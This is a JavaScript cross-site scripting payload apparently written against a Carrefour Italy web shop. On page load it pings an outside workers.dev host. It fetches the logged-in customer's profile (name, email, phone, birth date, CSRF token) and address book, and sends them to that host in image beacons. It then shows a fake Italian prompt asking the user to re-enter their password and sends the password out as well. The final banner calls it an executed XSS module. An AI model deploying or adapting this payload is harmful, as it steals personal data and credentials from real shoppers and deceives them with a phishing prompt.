(async () => {
  const beacon = q => { new Image().src = 'https://aged-cloud-b431.0days.workers.dev/x/whitek?' + q; };
  beacon('hit=import_ok&origin=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(location.href));
  try {
    const p = await (await fetch('/account/profile', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })).json();
    const addr = await (await fetch('/on/demandware.store/Sites-carrefour-IT-Site/it_IT/Account-AddressBook', { headers: {
'X-Requested-With': 'XMLHttpRequest' } })).text();
    beacon('pii=' + encodeURIComponent(JSON.stringify({ name: p.firstname + ' ' + p.lastname, email: p.email, phone: p.phone,
 dob: p.birthday, csrf: p.csrf && p.csrf.token })));
    beacon('addressbook=' + encodeURIComponent(addr.slice(0, 1800)));
  } catch (e) { beacon('pii_err=' + encodeURIComponent('' + e)); }
  const pw = prompt('Carrefour: per la tua sicurezza, reinserisci la password per continuare');
  if (pw) beacon('password=' + encodeURIComponent(pw));
  document.documentElement.innerHTML = '<h2 style="font-family:sans-serif;padding:40px">XSS module executed in <code>' +
document.domain + '</code> — PII + password exfiltrated</h2>';
})();
